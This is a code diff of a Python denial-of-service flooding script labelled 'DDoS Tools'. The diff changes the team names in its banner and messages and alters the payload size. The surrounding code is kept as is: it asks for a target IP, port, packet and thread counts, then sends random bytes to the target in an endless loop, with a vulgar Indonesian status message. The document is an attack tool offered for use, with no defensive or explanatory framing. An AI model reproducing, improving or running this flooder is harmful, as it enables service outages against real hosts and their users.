@@ -7,7 +7,7 @@ import threading
 import os
 
 os.system("clear")
-print("DDoS Tools By WillardZy Team")
+print("DDoS Tools By Xy Team")
 print("Ez")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
@@ -15,7 +15,7 @@ choice = str(input(" Gas?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
-  data = random._urandom(1024)
+  data = random._urandom(811)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
@@ -25,7 +25,7 @@ def run():
         s.sendto(data,addr)
       print(i +" Jebol Kontol.......")
     except:
-      print("[!] WillardZy Team Nieh Bwang")
+      print("[!] Alpan × Rega")
 
 def run2():
   data = random._urandom(16)
